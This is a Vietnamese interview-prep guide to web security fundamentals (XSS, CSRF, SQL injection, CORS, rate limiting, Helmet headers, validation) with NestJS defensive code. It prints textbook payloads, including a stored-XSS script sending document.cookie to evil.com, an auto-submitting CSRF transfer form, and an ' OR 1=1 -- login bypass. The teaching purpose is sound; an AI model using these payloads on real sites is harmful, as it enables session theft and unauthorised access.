# Bảo mật ứng dụng Web — Security Fundamentals

> Tài liệu ôn tập phỏng vấn — bao gồm toàn bộ kiến thức bảo mật ứng dụng web cần nắm: tấn công XSS (chèn mã độc phía trình duyệt), CSRF (giả mạo yêu cầu), SQL Injection (chèn mã SQL), cơ chế CORS (chia sẻ tài nguyên khác nguồn gốc), Rate Limiting (giới hạn tốc độ yêu cầu), Security Headers (tiêu đề bảo mật HTTP), và Input Validation (kiểm tra dữ liệu đầu vào).

---

## Mục lục

1. [XSS — Tấn công chèn mã JavaScript](#1-xss--tấn-công-chèn-mã-javascript)
2. [CSRF — Giả mạo yêu cầu từ trang khác](#2-csrf--giả-mạo-yêu-cầu-từ-trang-khác)
3. [SQL Injection — Chèn mã SQL vào truy vấn](#3-sql-injection--chèn-mã-sql-vào-truy-vấn)
4. [CORS — Chia sẻ tài nguyên khác nguồn gốc](#4-cors--chia-sẻ-tài-nguyên-khác-nguồn-gốc)
5. [Rate Limiting — Giới hạn tốc độ yêu cầu](#5-rate-limiting--giới-hạn-tốc-độ-yêu-cầu)
6. [Security Headers — Tiêu đề bảo mật HTTP](#6-security-headers--tiêu-đề-bảo-mật-http)
7. [Input Validation & Sanitization — Kiểm tra và làm sạch dữ liệu](#7-input-validation--sanitization--kiểm-tra-và-làm-sạch-dữ-liệu)
8. [Câu hỏi phỏng vấn thường gặp](#8-câu-hỏi-phỏng-vấn-thường-gặp)

---

# 1. XSS — Tấn công chèn mã JavaScript

## Khái niệm

**XSS (Cross-Site Scripting — tấn công chèn mã xuyên trang)** xảy ra khi kẻ tấn công **chèn mã JavaScript độc hại** vào trang web, khiến trình duyệt của nạn nhân thực thi đoạn mã đó mà nạn nhân không hề hay biết.

**Mục tiêu của kẻ tấn công:** Đánh cắp cookie hoặc token xác thực, chuyển hướng người dùng sang trang giả mạo, ghi lại thao tác bàn phím (keylogging), hoặc thay đổi nội dung trang web.

**Tại sao nguy hiểm?** Vì JavaScript chạy trong trình duyệt có quyền truy cập DOM (cấu trúc trang), cookie, localStorage, và có thể gửi yêu cầu HTTP thay mặt người dùng. Nếu mã độc được thực thi, nó có toàn quyền kiểm soát phiên làm việc của nạn nhân.

## 3 loại XSS

### Stored XSS (XSS lưu trữ — Persistent) — Nguy hiểm nhất

Mã độc được **lưu vào cơ sở dữ liệu** của server. Mỗi khi người dùng truy cập trang chứa nội dung đó, mã độc tự động chạy.

```
1. Kẻ tấn công → gửi bình luận chứa mã độc:
   <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

2. Server lưu bình luận vào cơ sở dữ liệu (KHÔNG làm sạch dữ liệu)

3. Người dùng khác mở trang → trình duyệt hiển thị bình luận → mã độc thực thi

4. Cookie/token của nạn nhân bị gửi tới trang của kẻ tấn công
```

**Nơi thường xảy ra:** Bình luận, bài đăng diễn đàn, hồ sơ cá nhân — bất kỳ nơi nào dữ liệu người dùng nhập được **lưu trữ** rồi **hiển thị** cho người khác.

### Reflected XSS (XSS phản xạ)

Mã độc **không được lưu trữ** mà nằm trực tiếp trong URL. Kẻ tấn công lừa nạn nhân nhấp vào đường dẫn chứa mã độc.

```
Kẻ tấn công gửi đường dẫn cho nạn nhân:
https://example.com/search?q=<script>alert('XSS')</script>

Server trả về: "Kết quả tìm kiếm cho: <script>alert('XSS')</script>"
→ Trình duyệt thực thi mã độc
```

**Nơi thường xảy ra:** Kết quả tìm kiếm, thông báo lỗi — nơi dữ liệu từ URL được **phản xạ** (reflect) lại trong nội dung trả về.

### DOM-based XSS (XSS dựa trên DOM)

Mã độc xảy ra **hoàn toàn phía trình duyệt** — server không liên quan. Code frontend đọc dữ liệu từ URL rồi chèn trực tiếp vào DOM mà không kiểm tra.

```javascript
// Code frontend đọc dữ liệu từ URL rồi chèn vào trang (NGUY HIỂM!)
const query = new URLSearchParams(window.location.search).get('q');
document.getElementById('output').innerHTML = query; // ← NGUY HIỂM! Chèn HTML thô

// Kẻ tấn công tạo URL: ?q=<img src=x onerror=alert('XSS')>
// → Trình duyệt tải thẻ <img>, lỗi tải ảnh → chạy mã trong onerror
```

**Khác biệt cốt lõi:** Server không bao giờ nhận hay trả về mã độc — lỗi hoàn toàn nằm ở code JavaScript phía trình duyệt.

## Phòng chống XSS

| Biện pháp | Giải thích |
|---|---|
| **Output Encoding (Mã hoá đầu ra)** | Chuyển đổi các ký tự đặc biệt HTML trước khi hiển thị: `<` → `&lt;`, `>` → `&gt;`. Trình duyệt hiển thị text thay vì thực thi như mã |
| **Input Sanitization (Làm sạch đầu vào)** | Loại bỏ hoặc vô hiệu hoá thẻ HTML nguy hiểm từ dữ liệu người dùng nhập. Thư viện phổ biến: `DOMPurify`, `sanitize-html` |
| **CSP Header (Chính sách bảo mật nội dung)** | `Content-Security-Policy: script-src 'self'` — chỉ cho phép thực thi JavaScript từ cùng nguồn gốc (origin), chặn mã từ bên ngoài |
| **httpOnly Cookie** | `Set-Cookie: token=xxx; HttpOnly` — đánh dấu cookie là httpOnly thì JavaScript không đọc được → kẻ tấn công không thể đánh cắp cookie qua XSS |
| **Framework tự bảo vệ** | React tự động mã hoá (escape) nội dung JSX bằng `textContent`. Angular tự làm sạch dữ liệu. **Tuyệt đối không dùng** `dangerouslySetInnerHTML` (React) hoặc `innerHTML` trực tiếp |

---

# 2. CSRF — Giả mạo yêu cầu từ trang khác

## Khái niệm

**CSRF (Cross-Site Request Forgery — giả mạo yêu cầu xuyên trang)**, đọc là "sea-surf", xảy ra khi kẻ tấn công **lừa trình duyệt của nạn nhân tự động gửi yêu cầu** tới trang web mà nạn nhân đang đăng nhập, **lợi dụng cookie tự động gửi kèm** của trình duyệt.

**Tại sao nguy hiểm?** Vì trình duyệt tự động gửi cookie (bao gồm cookie phiên đăng nhập) theo mọi yêu cầu tới domain đó — kẻ tấn công không cần biết cookie là gì, chỉ cần lừa trình duyệt gửi yêu cầu.

## Ví dụ tấn công

```
Điều kiện: Nạn nhân đang đăng nhập vào bank.com (cookie phiên còn hiệu lực)

1. Nạn nhân truy cập evil.com (trang của kẻ tấn công)
2. evil.com chứa mã HTML:
   <img src="https://bank.com/transfer?to=attacker&amount=10000">
   hoặc:
   <form action="https://bank.com/transfer" method="POST">
     <input type="hidden" name="to" value="attacker">
     <input type="hidden" name="amount" value="10000">
   </form>
   <script>document.forms[0].submit();</script>

3. Trình duyệt TỰ ĐỘNG gửi cookie của bank.com theo yêu cầu
   → Server bank.com nghĩ đây là yêu cầu hợp lệ từ nạn nhân
   → Tiền bị chuyển cho kẻ tấn công!
```

**Điểm mấu chốt:** Kẻ tấn công **không cần đánh cắp cookie** — trình duyệt tự gửi cookie kèm theo. Kẻ tấn công chỉ cần lừa nạn nhân truy cập trang chứa form hoặc thẻ ảnh giả.

## Phòng chống CSRF

| Biện pháp | Giải thích |
|---|---|
| **CSRF Token (Mã chống CSRF)** | Server tạo một mã ngẫu nhiên → nhúng vào form. Mỗi yêu cầu phải gửi kèm mã này → kẻ tấn công không biết mã nên không tạo được yêu cầu hợp lệ |
| **SameSite Cookie (Cookie cùng trang)** | `Set-Cookie: sid=xxx; SameSite=Strict` — cookie **không được gửi** theo yêu cầu từ trang khác (cross-site) → CSRF không thể lợi dụng cookie |
| **Double Submit Cookie (Gửi kép cookie)** | Gửi mã chống CSRF cả trong cookie lẫn trong header. Server so sánh hai giá trị — kẻ tấn công có thể gửi cookie (tự động) nhưng không đọc được giá trị để gửi trong header |
| **Dùng JWT trong header** | Thay vì cookie, gửi token trong `Authorization` header → trình duyệt **không tự động gửi** header → CSRF không hoạt động |

> **Liên hệ:** Đây là lý do JWT gửi qua header `Authorization` **miễn nhiễm CSRF**, còn session cookie thì **dễ bị tấn công**. Xem thêm tài liệu 01 - Authentication & JWT.

---

# 3. SQL Injection — Chèn mã SQL vào truy vấn

## Khái niệm

**SQL Injection (chèn mã SQL)** xảy ra khi kẻ tấn công chèn câu lệnh SQL vào dữ liệu đầu vào để **thay đổi logic truy vấn** chạy trên cơ sở dữ liệu. Hậu quả có thể là: xem toàn bộ dữ liệu, đăng nhập không cần mật khẩu, xoá dữ liệu, hoặc thậm chí chiếm quyền điều khiển server.

**Tại sao nguy hiểm?** Vì SQL Injection cho phép kẻ tấn công **tương tác trực tiếp với cơ sở dữ liệu** — nơi chứa toàn bộ dữ liệu quan trọng nhất của ứng dụng.

## Ví dụ tấn công

```sql
-- Code server ghép chuỗi trực tiếp (NGUY HIỂM):
SELECT * FROM users WHERE email = '${email}' AND password = '${password}'

-- Kẻ tấn công nhập email: ' OR 1=1 --
-- Truy vấn trở thành:
SELECT * FROM users WHERE email = '' OR 1=1 --' AND password = ''

-- Phân tích:
-- OR 1=1 → điều kiện luôn đúng → trả về TẤT CẢ users
-- --      → comment hoá phần còn lại → bỏ qua kiểm tra mật khẩu
-- Kết quả: kẻ tấn công đăng nhập thành công mà KHÔNG CẦN mật khẩu!
```

## Phòng chống SQL Injection

| Biện pháp | Giải thích |
|---|---|
| **Parameterized Queries (Truy vấn tham số hoá)** | Tách logic SQL khỏi dữ liệu: `WHERE email = $1` + `[userInput]`. Cơ sở dữ liệu xử lý dữ liệu như **giá trị thuần**, không phải lệnh SQL |
| **ORM (Prisma, TypeORM)** | ORM tự động tham số hoá truy vấn → an toàn mặc định. Không cần lo SQL Injection khi dùng API chuẩn của ORM |
| **Input Validation (Kiểm tra đầu vào)** | Kiểm tra định dạng dữ liệu (email, số, v.v.) trước khi đưa vào truy vấn |
| **Least Privilege (Quyền tối thiểu)** | Tài khoản cơ sở dữ liệu chỉ cấp quyền cần thiết (SELECT, INSERT — không cho DROP, DELETE toàn bảng) |

```javascript
// ❌ NGUY HIỂM — Ghép chuỗi trực tiếp → dễ bị SQL Injection
const query = `SELECT * FROM users WHERE email = '${email}'`;

// ✅ AN TOÀN — Truy vấn tham số hoá (Prisma tagged template)
const result = await prisma.$queryRaw`SELECT * FROM users WHERE email = ${email}`;
// Prisma tự tham số hoá qua tagged template literal

// ✅ AN TOÀN — Dùng API chuẩn của ORM
const user = await prisma.user.findUnique({ where: { email } });
// Prisma tự xử lý, không có cơ hội chèn SQL
```

---

# 4. CORS — Chia sẻ tài nguyên khác nguồn gốc

## Same-Origin Policy (Chính sách cùng nguồn gốc) là gì?

Trình duyệt mặc định **chặn** các yêu cầu từ nguồn gốc A tới nguồn gốc B (khác tên miền, cổng, hoặc giao thức). Đây là cơ chế bảo mật nền tảng của trình duyệt, ngăn trang web độc hại đọc dữ liệu từ trang web khác.

**Nguồn gốc (Origin) = Giao thức (Protocol) + Tên miền (Domain) + Cổng (Port)**

```
https://example.com:3000/path
└─┬──┘  └────┬─────┘└┬──┘
Giao thức  Tên miền  Cổng

https://example.com    vs  https://api.example.com   → Khác nguồn gốc (khác tên miền)
http://localhost:3000  vs  http://localhost:5000     → Khác nguồn gốc (khác cổng)
http://example.com     vs  https://example.com      → Khác nguồn gốc (khác giao thức)
```

## CORS (Cross-Origin Resource Sharing — Chia sẻ tài nguyên khác nguồn gốc) hoạt động thế nào?

CORS là cơ chế cho phép server **nới lỏng** chính sách cùng nguồn gốc bằng cách gửi các header HTTP cho phép trình duyệt chấp nhận phản hồi từ nguồn gốc khác.

### Yêu cầu đơn giản (Simple Requests — GET, POST với Content-Type đơn giản)

```
Trình duyệt ──► GET https://api.example.com/data
                Origin: https://frontend.com     ← trình duyệt tự thêm header này

Server       ──► 200 OK
                Access-Control-Allow-Origin: https://frontend.com
                ← Trình duyệt thấy header → cho phép frontend đọc phản hồi
```

### Yêu cầu kiểm tra trước (Preflight Request — PUT, DELETE, header tuỳ chỉnh)

Với các yêu cầu "phức tạp" (PUT, DELETE, hoặc có header tuỳ chỉnh như `Authorization`), trình duyệt **tự động gửi một yêu cầu OPTIONS trước** để "hỏi" server có cho phép không.

```
Bước 1: Trình duyệt tự gửi yêu cầu OPTIONS (preflight — kiểm tra trước)
Trình duyệt ──► OPTIONS https://api.example.com/data
                Origin: https://frontend.com
                Access-Control-Request-Method: DELETE
                Access-Control-Request-Headers: Authorization

Server       ──► 204 No Content
                Access-Control-Allow-Origin: https://frontend.com
                Access-Control-Allow-Methods: GET, POST, DELETE
                Access-Control-Allow-Headers: Authorization
                Access-Control-Max-Age: 86400  ← lưu kết quả kiểm tra 24 giờ (không hỏi lại)

Bước 2: Nếu preflight thành công → trình duyệt gửi yêu cầu thật
Trình duyệt ──► DELETE https://api.example.com/data/123
                Origin: https://frontend.com
                Authorization: Bearer xxx
```

### Cấu hình CORS trong NestJS

```typescript
// main.ts
app.enableCors({
  origin: ['https://frontend.com', 'http://localhost:3000'],  // danh sách nguồn gốc được phép
  methods: ['GET', 'POST', 'PUT', 'DELETE'],                  // phương thức HTTP được phép
  allowedHeaders: ['Authorization', 'Content-Type'],           // header được phép
  credentials: true,            // cho phép gửi cookie/credentials
  maxAge: 86400,                // lưu kết quả preflight 24 giờ
});
```

> **Quy tắc bắt buộc:** KHÔNG BAO GIỜ dùng `origin: '*'` (cho phép mọi nguồn gốc) kết hợp với `credentials: true` — đặc tả HTTP cấm điều này, trình duyệt sẽ chặn.

---

# 5. Rate Limiting — Giới hạn tốc độ yêu cầu

## Tại sao cần giới hạn tốc độ?

Giới hạn tốc độ bảo vệ server khỏi ba loại tấn công/lạm dụng phổ biến:

- **Brute Force (Dò mật khẩu)** — thử lần lượt hàng nghìn mật khẩu cho đến khi đúng
- **DDoS (Tấn công từ chối dịch vụ)** — gửi quá nhiều yêu cầu làm server quá tải, không phục vụ được người dùng thật
- **Scraping (Thu thập dữ liệu trái phép)** — bot tự động crawl dữ liệu liên tục

## Các thuật toán giới hạn tốc độ phổ biến

### Fixed Window (Cửa sổ cố định)

```
Quy tắc: Mỗi cửa sổ 1 phút → cho phép tối đa 100 yêu cầu
12:00:00 - 12:01:00 → đếm số yêu cầu → vượt 100 thì chặn

Nhược điểm (bài toán biên giới cửa sổ):
Nếu người dùng gửi 100 yêu cầu lúc 12:00:59
và 100 yêu cầu lúc 12:01:01
→ 200 yêu cầu trong 2 giây nhưng vẫn được chấp nhận!
(vì khác cửa sổ)
```

### Sliding Window (Cửa sổ trượt)

```
Tính số yêu cầu trong 1 phút VỪA QUA (trượt liên tục theo thời gian)
Tại 12:01:30 → đếm yêu cầu từ 12:00:30 đến 12:01:30 → chính xác hơn

Ưu điểm: Không bị vấn đề biên giới cửa sổ
Nhược điểm: Tốn bộ nhớ hơn (phải lưu thời điểm mỗi yêu cầu)
```

### Token Bucket (Thùng chứa token)

```
Thùng chứa tối đa 100 token
Mỗi yêu cầu tiêu 1 token
Mỗi giây thêm 10 token (tốc độ nạp lại)
Thùng hết token → yêu cầu bị từ chối (HTTP 429 — Too Many Requests)

Ưu điểm:
- Cho phép burst (đột biến) — dùng hết 100 token cùng lúc nếu cần
- Sau đó hồi phục dần theo tốc độ nạp
- Cân bằng giữa tính linh hoạt và bảo vệ server
```

### Cấu hình trong NestJS (Throttler)

```typescript
// app.module.ts
import { ThrottlerModule } from '@nestjs/throttler';

@Module({
  imports: [
    ThrottlerModule.forRoot({
      throttlers: [
        { ttl: 60000, limit: 100 }, // 100 yêu cầu mỗi 60 giây (toàn bộ ứng dụng)
      ],
    }),
  ],
})
export class AppModule {}

// Giới hạn riêng cho route cụ thể — ví dụ: đăng nhập chỉ cho 5 lần/phút
@Throttle({ default: { limit: 5, ttl: 60000 } })
@Post('/auth/login')
login() { ... }

// Bỏ qua giới hạn cho route không cần bảo vệ
@SkipThrottle()
@Get('/health')
health() { ... }
```

---

# 6. Security Headers — Tiêu đề bảo mật HTTP

## Helmet.js — Thêm tiêu đề bảo mật tự động

**Helmet** là thư viện middleware thêm các tiêu đề bảo mật HTTP vào mọi phản hồi, giúp bảo vệ ứng dụng khỏi nhiều loại tấn công phổ biến mà không cần cấu hình từng header thủ công.

```typescript
// Cài đặt trong NestJS
import helmet from 'helmet';
app.use(helmet());  // 1 dòng → thêm tất cả các header bảo mật
```

### Các tiêu đề bảo mật quan trọng

| Tiêu đề | Giá trị | Tác dụng |
|---|---|---|
| **Content-Security-Policy (Chính sách bảo mật nội dung)** | `script-src 'self'` | Chỉ cho phép thực thi JavaScript từ cùng nguồn gốc → chống XSS |
| **X-Content-Type-Options (Chặn đoán kiểu nội dung)** | `nosniff` | Chặn trình duyệt tự đoán kiểu MIME → chống MIME sniffing (trình duyệt chạy nhầm file text như script) |
| **X-Frame-Options (Chặn nhúng iframe)** | `DENY` | Chặn trang bị nhúng trong iframe → chống Clickjacking (lừa người dùng nhấn nút ẩn) |
| **Strict-Transport-Security (Buộc dùng HTTPS)** | `max-age=31536000` | Buộc trình duyệt chỉ truy cập qua HTTPS trong 1 năm → chống tấn công hạ cấp giao thức (downgrade attack) |
| **X-XSS-Protection (Bộ lọc XSS trình duyệt)** | `0` | Tắt bộ lọc XSS cũ của trình duyệt (có thể gây lỗi bảo mật) → nên dùng CSP thay thế |
| **Referrer-Policy (Chính sách giới thiệu)** | `no-referrer` | Không gửi header Referer (cho biết trang trước đó) → bảo vệ quyền riêng tư người dùng |

---

# 7. Input Validation & Sanitization — Kiểm tra và làm sạch dữ liệu

## Phân biệt Validation (Kiểm tra) và Sanitization (Làm sạch)

| | Validation (Kiểm tra) | Sanitization (Làm sạch) |
|---|---|---|
| **Mục đích** | Kiểm tra dữ liệu đầu vào có **đúng định dạng** không | **Biến đổi** dữ liệu để loại bỏ nội dung nguy hiểm |
| **Kết quả** | Chấp nhận hoặc từ chối (không thay đổi dữ liệu) | Trả về dữ liệu đã được làm sạch |
| **Ví dụ** | "Email phải có ký tự @" → nếu không có → từ chối | Xoá thẻ `<script>` khỏi nội dung bình luận |

**Nguyên tắc:** Luôn kiểm tra (validate) trước, làm sạch (sanitize) sau. Kiểm tra là tuyến phòng thủ đầu tiên — nếu dữ liệu sai định dạng thì từ chối ngay, không xử lý tiếp.

### Validation trong NestJS — class-validator + ValidationPipe

```typescript
import { IsEmail, IsString, MinLength, MaxLength } from 'class-validator';

class CreateUserDto {
  @IsEmail({}, { message: 'Email không hợp lệ' })
  email: string;

  @IsString()
  @MinLength(8, { message: 'Mật khẩu tối thiểu 8 ký tự' })
  @MaxLength(72, { message: 'Mật khẩu tối đa 72 ký tự' }) // giới hạn của bcrypt
  password: string;
}

// Bật kiểm tra tự động cho toàn bộ ứng dụng
app.useGlobalPipes(new ValidationPipe({
  whitelist: true,            // Tự động loại bỏ các trường không khai báo trong DTO
  forbidNonWhitelisted: true, // Báo lỗi nếu gửi trường không cho phép
  transform: true,            // Tự động chuyển kiểu dữ liệu (string → number, v.v.)
}));
```

### Validation bằng Zod (phương án thay thế)

```typescript
import { z } from 'zod';

const CreateUserSchema = z.object({
  email: z.string().email('Email không hợp lệ'),
  password: z.string().min(8).max(72),
});

// Kiểm tra
const result = CreateUserSchema.safeParse(input);
if (!result.success) {
  throw new BadRequestException(result.error.flatten());
}
```

---

# 8. Câu hỏi phỏng vấn thường gặp

| Câu hỏi | Gợi ý trả lời |
|---|---|
| XSS là gì? Phòng chống thế nào? | XSS (tấn công chèn mã xuyên trang) xảy ra khi kẻ tấn công chèn JavaScript độc hại vào trang web. Phòng chống bằng: mã hoá đầu ra (output encoding), CSP Header, httpOnly cookie, làm sạch đầu vào (sanitize input) |
| 3 loại XSS khác nhau thế nào? | **Stored (lưu trữ):** mã độc lưu vào cơ sở dữ liệu, nguy hiểm nhất. **Reflected (phản xạ):** mã độc nằm trong URL. **DOM-based:** xảy ra hoàn toàn phía trình duyệt, server không liên quan |
| CSRF là gì? Tại sao JWT miễn nhiễm? | CSRF (giả mạo yêu cầu xuyên trang) lừa trình duyệt gửi yêu cầu kèm cookie. JWT gửi qua header `Authorization` → trình duyệt không tự động gửi → CSRF không hoạt động. Session cookie thì dễ bị tấn công vì trình duyệt tự gửi cookie |
| SQL Injection là gì? Phòng chống? | Chèn mã SQL vào dữ liệu đầu vào để thay đổi logic truy vấn. Phòng chống bằng: truy vấn tham số hoá (parameterized queries), dùng ORM, kiểm tra đầu vào, cấp quyền tối thiểu cho tài khoản cơ sở dữ liệu |
| CORS là gì? Tại sao cần? | CORS (chia sẻ tài nguyên khác nguồn gốc) là cơ chế cho phép server nới lỏng chính sách cùng nguồn gốc của trình duyệt. Cần vì frontend và backend thường ở khác nguồn gốc (khác cổng hoặc tên miền) |
| Preflight request là gì? | Yêu cầu OPTIONS mà trình duyệt tự động gửi trước các yêu cầu phức tạp (PUT, DELETE, có header tuỳ chỉnh) để hỏi server có cho phép không |
| Rate Limiting dùng thuật toán nào? | Token Bucket (cho phép đột biến, linh hoạt), Sliding Window (chính xác, tốn bộ nhớ), Fixed Window (đơn giản, có vấn đề biên giới cửa sổ) |
| Helmet làm gì? | Thêm các tiêu đề bảo mật HTTP: CSP (chống XSS), HSTS (buộc HTTPS), X-Frame-Options (chống nhúng iframe/clickjacking) |
| Validation khác Sanitization thế nào? | Validation (kiểm tra) = xác nhận đúng/sai, không thay đổi dữ liệu → chấp nhận hoặc từ chối. Sanitization (làm sạch) = biến đổi dữ liệu, loại bỏ phần nguy hiểm |
